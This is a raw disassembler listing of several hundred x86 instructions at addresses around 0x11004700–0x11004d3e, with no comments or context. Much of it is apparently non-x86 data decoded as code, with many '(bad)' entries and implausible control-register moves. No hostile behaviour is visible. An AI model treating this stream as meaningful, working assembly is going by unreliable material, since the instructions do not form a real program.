110046ff:	add    BYTE PTR [ebx],dl
11004701:	adc    edi,DWORD PTR [eax]
11004703:	sub    dl,bh
11004705:	(bad)  
11004706:	(bad)  
11004707:	cmp    BYTE PTR [edx+0x4],cl
1100470a:	add    BYTE PTR [eax],al
1100470c:	or     DWORD PTR [esi],eax
1100470e:	mov    gs,WORD PTR [ecx-0x2]
11004711:	add    al,0x13
11004713:	mov    esp,cr5
11004716:	add    BYTE PTR [eax],al
11004718:	add    BYTE PTR [ebx],dl
1100471a:	adc    edi,DWORD PTR [eax]
1100471c:	psubd  mm7,mm7
1100471f:	call   DWORD PTR [ecx]
11004721:	(bad)  
11004724:	add    al,0x0
11004726:	add    BYTE PTR [eax],ah
11004728:	sbb    DWORD PTR [eax],eax
1100472a:	add    BYTE PTR [eax],al
1100472c:	adc    edx,DWORD PTR [ebx]
1100472e:	cmp    ah,bh
11004730:	stc    
11004731:	(bad)  
11004732:	(bad)  
11004733:	cmp    BYTE PTR [edx+0x4],bl
11004736:	add    BYTE PTR [eax],al
11004738:	and    BYTE PTR [edi],bh
1100473a:	add    BYTE PTR [eax],al
1100473c:	add    BYTE PTR [ebx],dl
1100473e:	adc    edi,DWORD PTR [eax]
11004740:	jmp    0x1100473b
11004742:	(bad)  
11004743:	call   DWORD PTR [ecx]
11004745:	add    al,0x6f
11004747:	sbb    DWORD PTR [eax],eax
11004749:	add    BYTE PTR [edx],cl
1100474b:	push   ss
1100474c:	inc    BYTE PTR [ecx]
1100474e:	push   ss
1100474f:	inc    BYTE PTR [ecx]
11004751:	cmp    BYTE PTR [esi+0x0],al
11004757:	sub    BYTE PTR [ebx],bl
11004759:	add    BYTE PTR [eax],al
1100475b:	or     dh,BYTE PTR [edx+0x27]
1100475e:	add    eax,DWORD PTR [eax]
11004760:	jo     0x110047d1
11004762:	sbb    al,0x0
11004764:	add    BYTE PTR [edx],cl
11004766:	pop    ss
11004767:	lea    edx,[eax+eax*1]
1100476a:	add    BYTE PTR [ecx],al
1100476c:	adc    edx,DWORD PTR [eax]
1100476e:	adc    DWORD PTR [eax],edx
11004770:	push   ss
11004771:	push   es
11004772:	or     DWORD PTR [edx+0x281011a2],ebx
11004778:	sbb    eax,0x280a0000
1100477d:	xor    eax,DWORD PTR [eax]
1100477f:	add    BYTE PTR [edx],cl
11004781:	add    BYTE PTR [eax],al
11004783:	and    BYTE PTR [eax],ch
11004785:	add    BYTE PTR [eax],al
11004787:	add    BYTE PTR [ebx],dl
11004789:	adc    edi,DWORD PTR [eax]
1100478b:	mov    al,ds:0x38fffff9
11004790:	ret    0xfffe
11004793:	inc    DWORD PTR [eax]
11004795:	adc    DWORD PTR [eax],ecx
11004797:	sub    BYTE PTR [esi+0x0],cl
1100479a:	add    BYTE PTR [edx],cl
1100479c:	adc    ecx,DWORD PTR [ecx]
1100479e:	add    BYTE PTR [eax],ah
110047a0:	xor    DWORD PTR [eax],eax
110047a2:	add    BYTE PTR [eax],al
110047a4:	adc    edx,DWORD PTR [ebx]
110047a6:	cmp    BYTE PTR [ecx+edi*8+0x538ffff],al
110047ad:	add    eax,DWORD PTR [eax]
110047af:	add    BYTE PTR [eax],ah
110047b1:	sub    eax,0x13000000
110047b6:	adc    edi,DWORD PTR [eax]
110047b8:	jae    0x110047b3
110047ba:	(bad)  
110047bb:	call   DWORD PTR [ecx]
110047bd:	add    al,0x16
110047bf:	outs   dx,DWORD PTR ds:[esi]
110047c0:	sbb    BYTE PTR [eax],al
110047c2:	add    BYTE PTR [edx],cl
110047c4:	pop    ds
110047c5:	and    al,BYTE PTR [eax+0x14]
110047c8:	cld    
110047c9:	(bad)  
110047ca:	jmp    DWORD PTR [eax]
110047cc:	or     BYTE PTR [eax],al
110047ce:	add    BYTE PTR [eax],al
110047d0:	adc    edx,DWORD PTR [ebx]
110047d2:	cmp    BYTE PTR [eax-0x7],bl
110047d5:	(bad)  
110047d6:	(bad)  
110047d7:	cmp    bh,bl
110047d9:	cli    
110047da:	(bad)  
110047db:	call   DWORD PTR [ebx]
110047dd:	mov    ebp,cr6
110047e0:	add    BYTE PTR [eax],al
110047e2:	add    BYTE PTR [ebx],dl
110047e4:	adc    edi,DWORD PTR [eax]
110047e6:	inc    ebp
110047e7:	stc    
110047e8:	(bad)  
110047e9:	call   DWORD PTR [ecx]
110047eb:	(bad)  
110047ee:	add    al,BYTE PTR [eax]
110047f0:	add    BYTE PTR [eax],ah
110047f2:	add    al,0x0
110047f4:	add    BYTE PTR [eax],al
110047f6:	adc    edx,DWORD PTR [ebx]
110047f8:	cmp    BYTE PTR [edx],dh
110047fa:	stc    
110047fb:	(bad)  
110047fc:	(bad)  
110047fd:	cmp    BYTE PTR [ebx-0x2],al
11004800:	(bad)  
11004801:	call   DWORD PTR [edi]
11004803:	sub    eax,DWORD PTR [ebx]
11004805:	push   ss
11004806:	sub    eax,DWORD PTR [eax]
11004808:	sub    al,0x0
1100480a:	add    BYTE PTR [eax],al
1100480c:	and    BYTE PTR ds:0x13000000,ah
11004812:	adc    edi,DWORD PTR [eax]
11004814:	pop    ss
11004815:	stc    
11004816:	(bad)  
11004817:	(bad)  
11004818:	cmp    BYTE PTR [esi],al
1100481a:	cld    
1100481b:	(bad)  
1100481c:	inc    DWORD PTR [edi]
1100481e:	adc    DWORD PTR [edx],ecx
11004820:	outs   dx,DWORD PTR ds:[esi]
11004821:	inc    ebp
11004822:	add    BYTE PTR [eax],al
11004824:	or     ah,BYTE PTR [esi]
11004826:	and    BYTE PTR [ecx],ah
11004828:	add    BYTE PTR [eax],al
1100482a:	add    BYTE PTR [ebx],dl
1100482c:	adc    edi,DWORD PTR [eax]
1100482e:	std    
1100482f:	clc    
11004830:	(bad)  
11004831:	(bad)  
11004832:	cmp    BYTE PTR [eax],cl
11004834:	std    
11004835:	(bad)  
11004836:	jmp    DWORD PTR [eax]
11004838:	or     DWORD PTR [eax],eax
1100483a:	add    BYTE PTR [eax],al
1100483c:	adc    edx,DWORD PTR [ebx]
1100483e:	sub    eax,DWORD PTR [edx]
11004840:	sub    eax,DWORD PTR [edi+0x11]
11004843:	adc    eax,DWORD PTR [ebp+0x10]
11004846:	add    BYTE PTR [eax],al
11004848:	add    BYTE PTR [eax-0x3cffffff],bl
1100484e:	add    BYTE PTR [eax],al
11004850:	add    BYTE PTR [eax+eax*1+0x0],ch
11004854:	add    BYTE PTR [edi],dh
11004856:	add    DWORD PTR [eax],eax
11004858:	add    BYTE PTR [ebp+0x0],dl
1100485b:	add    BYTE PTR [eax],al
1100485d:	cmp    BYTE PTR [eax],al
1100485f:	add    BYTE PTR [eax],al
11004861:	xchg   ecx,eax
11004862:	add    BYTE PTR [eax],al
11004864:	add    BYTE PTR [eax+0x16000000],dh
1100486a:	add    DWORD PTR [eax],eax
1100486c:	add    BYTE PTR [edi+0x7fffffff],dh
11004872:	add    BYTE PTR [eax],al
11004874:	add    BYTE PTR [ecx],ch
11004876:	add    DWORD PTR [eax],eax
11004878:	add    ah,al
1100487a:	add    DWORD PTR [eax],eax
1100487c:	add    BYTE PTR [eax],ch
1100487e:	add    BYTE PTR [eax],al
11004880:	add    BYTE PTR [ebx-0x60ffffff],dh
11004886:	add    BYTE PTR [eax],al
11004888:	add    BYTE PTR [eax],bh
1100488a:	push   edx
1100488b:	add    BYTE PTR [eax],al
1100488d:	add    BYTE PTR [esi+0x3],bh
11004890:	add    BYTE PTR [eax],al
11004892:	add    al,0x11
11004894:	or     ch,BYTE PTR [edi+0x48]
11004897:	add    BYTE PTR [eax],al
11004899:	or     ch,BYTE PTR [edi+0x49]
1100489c:	add    BYTE PTR [eax],al
1100489e:	or     dl,BYTE PTR [ebx]
110048a0:	or     edx,DWORD PTR [ecx]
110048a2:	or     edx,DWORD PTR [esi+edi*8]
110048a5:	add    DWORD PTR [ebx],edx
110048a7:	mov    ebp,cr1
110048aa:	add    BYTE PTR [eax],al
110048ac:	add    BYTE PTR [ebx],dl
110048ae:	adc    ebp,DWORD PTR [ebx]
110048b0:	xchg   ecx,eax
110048b1:	adc    DWORD PTR [edi],ecx
110048b3:	cmp    ch,BYTE PTR [esi+0x1]
110048b6:	add    BYTE PTR [eax],al
110048b8:	and    BYTE PTR ds:0x13000000,al
110048be:	adc    ebp,DWORD PTR [ebx]
110048c0:	sub    DWORD PTR [ebx],0x110b1100
110048c6:	or     ch,BYTE PTR [edi+0x3e]
110048c9:	add    BYTE PTR [eax],al
110048cb:	or     ch,BYTE PTR [edi+0x3c]
110048ce:	add    BYTE PTR [eax],al
110048d0:	or     al,BYTE PTR [eax]
110048d2:	and    BYTE PTR [eax+eax*1],al
110048d5:	add    BYTE PTR [eax],al
110048d7:	adc    edx,DWORD PTR [ebx]
110048d9:	cmp    BYTE PTR [edi+edi*8-0x1],ah
110048dd:	jmp    FWORD PTR [ebx]
110048df:	sub    eax,0x4f6f1111
110048e4:	add    BYTE PTR [eax],al
110048e6:	or     dl,BYTE PTR [ebx]
110048e8:	mov    edx,cr0
110048eb:	add    BYTE PTR [eax],al
110048ed:	add    BYTE PTR [ebx],dl
110048ef:	adc    edi,DWORD PTR [eax]
110048f1:	dec    ebp
110048f2:	(bad)  
110048f3:	(bad)  
110048f4:	call   DWORD PTR [ecx]
110048f6:	(bad)  
110048f9:	add    BYTE PTR [eax],al
110048fb:	add    BYTE PTR [eax],ah
110048fd:	or     al,BYTE PTR [eax]
110048ff:	add    BYTE PTR [eax],al
11004901:	adc    edx,DWORD PTR [ebx]
11004903:	cmp    BYTE PTR [edx],bh
11004905:	(bad)  
11004906:	(bad)  
11004907:	(bad)  
11004908:	cmp    BYTE PTR [ecx+eax*1],dh
1100490b:	add    BYTE PTR [eax],al
1100490d:	add    BYTE PTR [eax],ah
1100490f:	push   es
11004910:	add    BYTE PTR [eax],al
11004912:	add    BYTE PTR [ebx],dl
11004914:	adc    edi,DWORD PTR [eax]
11004916:	sub    bh,bh
11004918:	(bad)  
11004919:	jmp    FWORD PTR [ebx]
1100491b:	les    esp,FWORD PTR [eax]
1100491d:	sldt   WORD PTR [eax]
11004920:	add    BYTE PTR [ebx],dl
11004922:	adc    edi,DWORD PTR [eax]
11004924:	sbb    bh,bh
11004926:	(bad)  
11004927:	call   DWORD PTR [edi]
11004929:	sub    eax,DWORD PTR [eax]
1100492b:	adc    ecx,DWORD PTR [edi]
1100492d:	and    BYTE PTR [edi],al
1100492f:	add    BYTE PTR [eax],al
11004931:	add    BYTE PTR [ebx],dl
11004933:	adc    edi,DWORD PTR [eax]
11004935:	or     edi,edi
11004937:	(bad)  
11004938:	call   DWORD PTR [ecx]
1100493a:	(bad)  
1100493d:	(bad)  
1100493e:	(bad)  
1100493f:	jmp    DWORD PTR [eax]
11004941:	add    DWORD PTR [eax],eax
11004943:	add    BYTE PTR [eax],al
11004945:	adc    edx,DWORD PTR [ebx]
11004947:	cmp    dh,dh
11004949:	(bad)  
1100494a:	(bad)  
1100494b:	(bad)  
1100494c:	cmp    BYTE PTR [edi+0x11000000],dl
11004952:	adc    DWORD PTR [edi+0x50],ebp
11004955:	add    BYTE PTR [eax],al
11004957:	or     dh,BYTE PTR [eax+ebp*1+0x0]
1100495b:	add    BYTE PTR [ecx],al
1100495d:	adc    ecx,DWORD PTR ds:0x6f0d1100
11004963:	push   ecx
11004964:	add    BYTE PTR [eax],al
11004966:	or     ch,BYTE PTR [edi+0x52]
11004969:	add    BYTE PTR [eax],al
1100496b:	or     ch,BYTE PTR [eax]
1100496d:	cmp    al,BYTE PTR [eax]
1100496f:	add    BYTE PTR [edx],cl
11004971:	adc    DWORD PTR ds:0x516f,ecx
11004977:	or     ch,BYTE PTR [edi+0x52]
1100497a:	add    BYTE PTR [eax],al
1100497c:	or     ch,BYTE PTR [eax]
1100497e:	xor    BYTE PTR [eax],al
11004980:	add    BYTE PTR [edx],cl
11004982:	jae    0x110049bf
11004984:	add    BYTE PTR [eax],al
11004986:	or     dl,BYTE PTR [ebx]
11004988:	or     dl,BYTE PTR [ecx]
1100498a:	or     dl,BYTE PTR [ecx]
1100498c:	add    eax,0x3c6f
11004991:	or     al,BYTE PTR [eax]
11004993:	and    BYTE PTR [eax],cl
11004995:	add    BYTE PTR [eax],al
11004997:	add    BYTE PTR [ebx],dl
11004999:	adc    edi,DWORD PTR [eax]
1100499b:	mov    ds:0x11fffffe,eax
110049a0:	push   es
110049a1:	cmp    dh,BYTE PTR [esi-0x1]
110049a4:	(bad)  
110049a5:	jmp    DWORD PTR [eax]
110049a7:	or     eax,DWORD PTR [eax]
110049a9:	add    BYTE PTR [eax],al
110049ab:	adc    edx,DWORD PTR [ebx]
110049ad:	cmp    BYTE PTR [eax+0x2bfffffe],dl
110049b3:	add    BYTE PTR [eax],ah
110049b5:	add    eax,DWORD PTR [eax]
110049b7:	add    BYTE PTR [eax],al
110049b9:	adc    edx,DWORD PTR [ebx]
110049bb:	cmp    BYTE PTR [edx+0x11fffffe],al
110049c1:	or     eax,0x516f
110049c6:	or     ch,BYTE PTR [edi+0x52]
110049c9:	add    BYTE PTR [eax],al
110049cb:	or     ch,BYTE PTR [eax]
110049cd:	and    DWORD PTR [eax],eax
110049cf:	add    BYTE PTR [edx],cl
110049d1:	outs   dx,DWORD PTR ds:[esi]
110049d2:	and    al,BYTE PTR [eax]
110049d4:	add    BYTE PTR [edx],cl
110049d6:	jb     0x110049f5
110049d8:	add    eax,DWORD PTR [eax]
110049da:	jo     0x11004a4b
110049dc:	and    eax,DWORD PTR [eax]
110049de:	add    BYTE PTR [edx],cl
110049e0:	push   ss
110049e1:	inc    BYTE PTR [ecx]
110049e3:	cmp    BYTE PTR [ebx-0x1],al
110049e6:	(bad)  
110049e7:	inc    DWORD PTR [eax]
110049e9:	sub    BYTE PTR [ebx],bl
110049eb:	add    BYTE PTR [eax],al
110049ed:	or     dh,BYTE PTR [edx+0x27]
110049f0:	add    eax,DWORD PTR [eax]
110049f2:	jo     0x11004a63
110049f4:	sbb    al,0x0
110049f6:	add    BYTE PTR [edx],cl
110049f8:	pop    ss
110049f9:	lea    edx,[eax+eax*1]
110049fc:	add    BYTE PTR [ecx],al
110049fe:	adc    edx,DWORD PTR [eax]
11004a00:	adc    DWORD PTR [eax],edx
11004a02:	push   ss
11004a03:	push   es
11004a04:	or     DWORD PTR [edx+0x281011a2],ebx
11004a0a:	sbb    eax,0x280a0000
11004a0f:	xor    eax,DWORD PTR [eax]
11004a11:	add    BYTE PTR [edx],cl
11004a13:	add    BYTE PTR [eax],al
11004a15:	and    BYTE PTR [eax],al
11004a17:	add    BYTE PTR [eax],al
11004a19:	add    BYTE PTR [ebx],dl
11004a1b:	adc    edi,DWORD PTR [eax]
11004a1d:	and    esi,edi
11004a1f:	(bad)  
11004a20:	(bad)  
11004a21:	cmp    BYTE PTR [eax-0x2],ch
11004a24:	(bad)  
11004a25:	call   DWORD PTR [ecx]
11004a27:	or     al,0x11
11004a29:	or     ch,BYTE PTR [edi+0x53]
11004a2c:	add    BYTE PTR [eax],al
11004a2e:	or     al,BYTE PTR [eax]
11004a30:	and    BYTE PTR [esi],cl
11004a32:	add    BYTE PTR [eax],al
11004a34:	add    BYTE PTR [ebx],dl
11004a36:	adc    edi,DWORD PTR [eax]
11004a38:	push   es
11004a39:	(bad)  
11004a3a:	(bad)  
11004a3b:	(bad)  
11004a3c:	cmp    ah,cl
11004a3e:	(bad)  
11004a3f:	(bad)  
11004a40:	jmp    DWORD PTR [eax]
11004a42:	or     al,0x0
11004a44:	add    BYTE PTR [eax],al
11004a46:	adc    edx,DWORD PTR [ebx]
11004a48:	cmp    ch,dh
11004a4a:	std    
11004a4b:	(bad)  
11004a4c:	(bad)  
11004a4d:	fnsave [eax+0x2bfffffd]
11004a53:	adc    edx,DWORD PTR [ecx]
11004a55:	adc    eax,DWORD PTR [ebp+0x3]
11004a58:	add    BYTE PTR [eax],al
11004a5a:	add    BYTE PTR [ecx],bh
11004a5c:	add    BYTE PTR [eax],al
11004a5e:	add    BYTE PTR [ecx],bl
11004a60:	add    BYTE PTR [eax],al
11004a62:	add    BYTE PTR [esi],ah
11004a64:	add    BYTE PTR [eax],al
11004a66:	add    BYTE PTR [ecx],dl
11004a68:	adc    DWORD PTR [ebp+0x2a],esi
11004a6b:	add    BYTE PTR [eax],al
11004a6d:	add    DWORD PTR [ebx],edx
11004a6f:	adc    dl,BYTE PTR [ecx]
11004a71:	adc    dl,BYTE PTR [esi+edi*8]
11004a74:	add    DWORD PTR [ebx],edx
11004a76:	mov    ecx,cr0
11004a79:	add    BYTE PTR [eax],al
11004a7b:	add    BYTE PTR [ebx],dl
11004a7d:	adc    ebp,DWORD PTR [ebx]
11004a7f:	aam    0x11
11004a81:	cvtps2pi mm3,QWORD PTR [esi]
11004a84:	and    BYTE PTR [edx],al
11004a86:	add    BYTE PTR [eax],al
11004a88:	add    BYTE PTR [ebx],dl
11004a8a:	adc    ebp,DWORD PTR [ebx]
11004a8c:	(bad)  
11004a8d:	sub    eax,DWORD PTR [eax]
11004a8f:	adc    DWORD PTR [edx],edx
11004a91:	outs   dx,DWORD PTR ds:[esi]
11004a92:	push   esp
11004a93:	add    BYTE PTR [eax],al
11004a95:	or     al,BYTE PTR [eax]
11004a97:	and    BYTE PTR [eax],al
11004a99:	add    BYTE PTR [eax],al
11004a9b:	add    BYTE PTR [ebx],dl
11004a9d:	adc    ebp,DWORD PTR [ebx]
11004a9f:	mov    ah,0x2b
11004aa1:	add    ah,bl
11004aa3:	and    BYTE PTR [eax+eax*1],ah
11004aa6:	add    BYTE PTR [eax],al
11004aa8:	adc    edx,DWORD PTR [ebx]
11004aaa:	cmp    BYTE PTR [eax+0x17fffff6],al
11004ab0:	cmp    BYTE PTR [edx+edi*8+0x911ffff],bl
11004ab7:	adc    al,0xfe
11004ab9:	add    DWORD PTR [esi],edx
11004abb:	inc    BYTE PTR [ecx]
11004abd:	adc    ecx,DWORD PTR [edi]
11004abf:	and    BYTE PTR [esi],dl
11004ac1:	add    BYTE PTR [eax],al
11004ac3:	add    BYTE PTR [ebx],dl
11004ac5:	adc    edi,DWORD PTR [eax]
11004ac7:	fs idiv bh
11004aca:	call   DWORD PTR [ecx]
11004acc:	(bad)  
11004acf:	cli    
11004ad0:	(bad)  
11004ad1:	jmp    DWORD PTR [eax]
11004ad3:	and    eax,DWORD PTR [eax]
11004ad5:	add    BYTE PTR [eax],al
11004ad7:	adc    edx,DWORD PTR [ebx]
11004ad9:	cmp    BYTE PTR [ecx-0xa],dl
11004adc:	(bad)  
11004add:	(bad)  
11004ade:	cmp    BYTE PTR [eax],ah
11004ae0:	clc    
11004ae1:	(bad)  
11004ae2:	call   DWORD PTR [edi]
11004ae4:	adc    eax,DWORD PTR ds:0x20061316
11004aea:	cmp    DWORD PTR [eax],eax
11004aec:	add    BYTE PTR [eax],al
11004aee:	adc    edx,DWORD PTR [ebx]
11004af0:	cmp    BYTE PTR [edx],bh
11004af2:	idiv   bh
11004af4:	call   DWORD PTR [ecx]
11004af6:	add    al,0x16
11004af8:	outs   dx,DWORD PTR ds:[esi]
11004af9:	sbb    BYTE PTR [eax],al
11004afb:	add    BYTE PTR [edx],cl
11004afd:	pop    ds
11004afe:	sub    edi,DWORD PTR [ebx]
11004b00:	or     eax,0x20fffff9
11004b05:	adc    DWORD PTR [eax],eax
11004b07:	add    BYTE PTR [eax],al
11004b09:	adc    edx,DWORD PTR [ebx]
11004b0b:	cmp    BYTE PTR [edi],bl
11004b0d:	idiv   bh
11004b0f:	(bad)  
11004b10:	cmp    dh,cl
11004b12:	idiv   edi
11004b14:	jmp    DWORD PTR [eax]
11004b16:	cmp    eax,0x13000000
11004b1b:	adc    edi,DWORD PTR [eax]
11004b1d:	push   cs
11004b1e:	idiv   bh
11004b20:	call   DWORD PTR [edi]
11004b22:	cmp    BYTE PTR [edi+0xfffffa],ah
11004b28:	push   es
11004b29:	or     DWORD PTR [edx+0x366f],ebx
11004b2f:	or     dl,BYTE PTR [ebx]
11004b31:	add    al,0x20
11004b33:	adc    eax,DWORD PTR [eax]
11004b35:	add    BYTE PTR [eax],al
11004b37:	adc    edx,DWORD PTR [ebx]
11004b39:	cmp    cl,dh
11004b3b:	cmc    
11004b3c:	(bad)  
11004b3d:	call   DWORD PTR [ecx]
11004b3f:	add    al,0x39
11004b41:	sub    ecx,edi
11004b43:	(bad)  
11004b44:	jmp    DWORD PTR [eax]
11004b46:	sldt   WORD PTR [eax]
11004b49:	add    BYTE PTR [ebx],dl
11004b4b:	adc    edi,DWORD PTR [eax]
11004b4d:	fdivrp st(5),st
11004b4f:	(bad)  
11004b50:	(bad)  
11004b51:	cmp    dl,ah
11004b53:	sti    
11004b54:	(bad)  
11004b55:	inc    DWORD PTR [eax]
11004b57:	sub    BYTE PTR [ebx],bl
11004b59:	add    BYTE PTR [eax],al
11004b5b:	or     dh,BYTE PTR [edx+0x57]
11004b5e:	add    eax,DWORD PTR [eax]
11004b60:	jo     0x11004bd1
11004b62:	sbb    al,0x0
11004b64:	add    BYTE PTR [edx],cl
11004b66:	pop    ss
11004b67:	lea    edx,[eax+eax*1]
11004b6a:	add    BYTE PTR [ecx],al
11004b6c:	adc    edx,DWORD PTR [eax]
11004b6e:	adc    DWORD PTR [eax],edx
11004b70:	push   ss
11004b71:	or     BYTE PTR [edx+0x1d281011],ah
11004b77:	add    BYTE PTR [eax],al
11004b79:	or     dh,BYTE PTR [ebx+0x1e]
11004b7c:	add    BYTE PTR [eax],al
11004b7e:	or     bh,BYTE PTR [edx+0x0]
11004b81:	and    BYTE PTR [ebx],dh
11004b83:	add    BYTE PTR [eax],al
11004b85:	add    BYTE PTR [ebx],dl
11004b87:	adc    edi,DWORD PTR [eax]
11004b89:	mov    ds:0x38fffff5,al
11004b8e:	push   ds
11004b8f:	cld    
11004b90:	(bad)  
11004b91:	jmp    FWORD PTR [edx]
11004b93:	add    BYTE PTR [ecx+0x1c],al
11004b96:	add    BYTE PTR [eax],al
11004b98:	add    al,BYTE PTR [eax]
11004b9a:	add    BYTE PTR [eax],al
11004b9c:	sbb    eax,DWORD PTR [edi]
11004b9e:	add    BYTE PTR [eax],al
11004ba0:	sbb    eax,DWORD PTR [edx]
11004ba2:	add    BYTE PTR [eax],al
11004ba4:	or     DWORD PTR ss:[eax],eax
11004ba7:	add    BYTE PTR [ecx+0x0],dl
11004baa:	add    BYTE PTR [eax],al
11004bac:	add    BYTE PTR [eax],al
11004bae:	add    BYTE PTR [eax],al
11004bb0:	adc    esi,DWORD PTR [eax]
11004bb2:	add    al,BYTE PTR [eax]
11004bb4:	sbb    al,BYTE PTR [eax]
11004bb6:	add    BYTE PTR [eax],al
11004bb8:	add    BYTE PTR [eax],al
11004bba:	add    BYTE PTR [eax],al
11004bbc:	add    BYTE PTR [edx],al
11004bbe:	sub    BYTE PTR [ecx],cl
11004bc0:	add    BYTE PTR [eax],al
11004bc2:	push   es
11004bc3:	add    BYTE PTR [esi+0x3],bh
11004bc6:	add    BYTE PTR [eax],al
11004bc8:	add    al,0x2
11004bca:	sub    BYTE PTR [eax],cl
11004bcc:	add    BYTE PTR [eax],al
11004bce:	push   es
11004bcf:	outs   dx,DWORD PTR ds:[esi]
11004bd0:	push   ebp
11004bd1:	add    BYTE PTR [eax],al
11004bd3:	or     al,BYTE PTR [eax]
11004bd5:	sub    al,BYTE PTR [eax]
11004bd7:	add    BYTE PTR [ebx],dl
11004bd9:	xor    BYTE PTR [edx],al
11004bdb:	add    BYTE PTR [edx],bl
	...
11004be5:	add    ch,BYTE PTR [eax]
11004be7:	or     DWORD PTR [eax],eax
11004be9:	add    BYTE PTR [esi],al
11004beb:	add    BYTE PTR [esi+0x3],bh
11004bee:	add    BYTE PTR [eax],al
11004bf0:	add    al,0x2
11004bf2:	sub    BYTE PTR [eax],cl
11004bf4:	add    BYTE PTR [eax],al
11004bf6:	push   es
11004bf7:	outs   dx,DWORD PTR ds:[esi]
11004bf8:	push   esi
11004bf9:	add    BYTE PTR [eax],al
11004bfb:	or     al,BYTE PTR [eax]
11004bfd:	sub    al,BYTE PTR [eax]
11004bff:	add    BYTE PTR [ebx],dl
11004c01:	xor    BYTE PTR [ecx],al
11004c03:	add    BYTE PTR [edi],cl
	...
11004c0d:	add    ch,BYTE PTR [eax]
11004c0f:	or     DWORD PTR [eax],eax
11004c11:	add    BYTE PTR [esi],al
11004c13:	add    BYTE PTR [edx],al
11004c15:	add    BYTE PTR [edi],0x0
11004c18:	add    BYTE PTR [edx+ebp*1],al
11004c1b:	add    BYTE PTR [ebx],dl
11004c1d:	xor    BYTE PTR [eax+eax*1],al
11004c20:	dec    edx
11004c21:	add    DWORD PTR [eax],eax
11004c23:	add    BYTE PTR [edx],cl
11004c25:	add    BYTE PTR [eax],al
11004c27:	adc    DWORD PTR [ebx],ebp
11004c29:	xor    dl,BYTE PTR [edi]
11004c2b:	sub    eax,DWORD PTR [ebx]
11004c2d:	push   ss
11004c2e:	sub    eax,DWORD PTR [eax]
11004c30:	sub    al,0x0
11004c32:	or     DWORD PTR [ebp+0x9],eax
11004c35:	add    BYTE PTR [eax],al
11004c37:	add    bl,ah
11004c39:	add    BYTE PTR [eax],al
11004c3b:	add    BYTE PTR [ebx],ch
11004c3d:	add    BYTE PTR [eax],al
11004c3f:	add    BYTE PTR [eax],dl
11004c41:	add    DWORD PTR [eax],eax
11004c43:	add    BYTE PTR [edx+0x0],dh
11004c46:	add    BYTE PTR [eax],al
11004c48:	nop
11004c49:	add    BYTE PTR [eax],al
11004c4b:	add    BYTE PTR [edx],al
11004c4d:	add    DWORD PTR [eax],eax
11004c4f:	add    ch,dl
11004c51:	add    BYTE PTR [eax],al
11004c53:	add    BYTE PTR [eax+eax*1+0x0],dl
11004c57:	add    BYTE PTR [ecx],bh
11004c59:	add    BYTE PTR [eax],al
11004c5b:	add    BYTE PTR [eax],al
11004c5d:	add    ch,BYTE PTR [eax]
11004c5f:	or     DWORD PTR [eax],eax
11004c61:	add    BYTE PTR [esi],al
11004c63:	add    BYTE PTR [edx],al
11004c65:	sub    BYTE PTR [ecx],ah
11004c67:	add    BYTE PTR [eax],al
11004c69:	or     ch,BYTE PTR [edi+0x22]
11004c6c:	add    BYTE PTR [eax],al
11004c6e:	or     cl,BYTE PTR [edx]
11004c70:	push   es
11004c71:	jb     0x11004bfc
11004c73:	add    eax,DWORD PTR [eax]
11004c75:	jo     0x11004ce6
11004c77:	adc    eax,0x160a0000
11004c7c:	inc    BYTE PTR [ecx]
11004c7e:	or     esp,DWORD PTR [eax]
11004c80:	add    DWORD PTR [eax],eax
11004c82:	add    BYTE PTR [eax],al
11004c84:	or     eax,0x3a07a32b
11004c89:	mov    al,BYTE PTR [eax]
11004c8b:	add    BYTE PTR [eax],al
11004c8d:	and    BYTE PTR [eax],cl
11004c8f:	add    BYTE PTR [eax],al
11004c91:	add    BYTE PTR ds:0x3c2b952b,cl
11004c97:	add    BYTE PTR [esi+0x3],bh
11004c9a:	add    BYTE PTR [eax],al
11004c9c:	add    al,0x16
11004c9e:	outs   dx,DWORD PTR ds:[esi]
11004c9f:	push   edi
11004ca0:	add    BYTE PTR [eax],al
11004ca2:	or     al,BYTE PTR [eax]
11004ca4:	add    BYTE PTR [eax],ah
11004ca6:	pop    es
11004ca7:	add    BYTE PTR [eax],al
11004ca9:	add    BYTE PTR ds:0xffff7a38,cl
11004caf:	(bad)  
11004cb0:	cmp    BYTE PTR [eax+eax*1+0x7e000000],bh
11004cb7:	add    eax,DWORD PTR [eax]
11004cb9:	add    BYTE PTR [edi+edx*1],al
11004cbc:	outs   dx,DWORD PTR ds:[esi]
11004cbd:	push   edi
11004cbe:	add    BYTE PTR [eax],al
11004cc0:	or     al,BYTE PTR [eax]
11004cc2:	add    BYTE PTR [eax],ah
11004cc4:	add    eax,DWORD PTR [eax]
11004cc6:	add    BYTE PTR [eax],al
11004cc8:	or     eax,0xffff5c38
11004ccd:	(bad)  
11004cce:	cmp    BYTE PTR [esi+0x0],bl
11004cd4:	jle    0x11004cd9
11004cd6:	add    BYTE PTR [eax],al
11004cd8:	add    al,0x18
11004cda:	outs   dx,DWORD PTR ds:[esi]
11004cdb:	push   edi
11004cdc:	add    BYTE PTR [eax],al
11004cde:	or     al,BYTE PTR [eax]
11004ce0:	add    BYTE PTR [eax],ah
11004ce2:	add    al,0x0
11004ce4:	add    BYTE PTR [eax],al
11004ce6:	or     eax,0xffff3e38
11004ceb:	(bad)  
11004cec:	cmp    BYTE PTR [eax+0x28000000],al
11004cf2:	sbb    eax,DWORD PTR [eax]
11004cf4:	add    BYTE PTR [edx],cl
11004cf6:	jb     0x11004ccd
11004cf8:	add    DWORD PTR [eax],eax
11004cfa:	jo     0x11004d6b
11004cfc:	sbb    al,0x0
11004cfe:	add    BYTE PTR [edx],cl
11004d00:	pop    ss
11004d01:	lea    edx,[eax+eax*1]
11004d04:	add    BYTE PTR [ecx],al
11004d06:	or     al,0x8
11004d08:	push   ss
11004d09:	add    ah,BYTE PTR [edx+0x1d2808]
11004d0f:	add    BYTE PTR [edx],cl
11004d11:	jae    0x11004d31
11004d13:	add    BYTE PTR [eax],al
11004d15:	or     bh,BYTE PTR [edx+0x6]
11004d18:	jb     0x11004cb7
11004d1a:	add    eax,DWORD PTR [eax]
11004d1c:	jo     0x11004d8d
11004d1e:	adc    eax,0x160a0000
11004d23:	inc    BYTE PTR [ecx]
11004d25:	or     esp,DWORD PTR [eax]
11004d27:	push   es
11004d28:	add    BYTE PTR [eax],al
11004d2a:	add    BYTE PTR ds:0xfffef938,cl
11004d30:	inc    DWORD PTR [edi]
11004d32:	sub    eax,0x2010
11004d37:	add    BYTE PTR [eax],al
11004d39:	or     eax,0xfffeeb38
11004d3e:	(bad)  
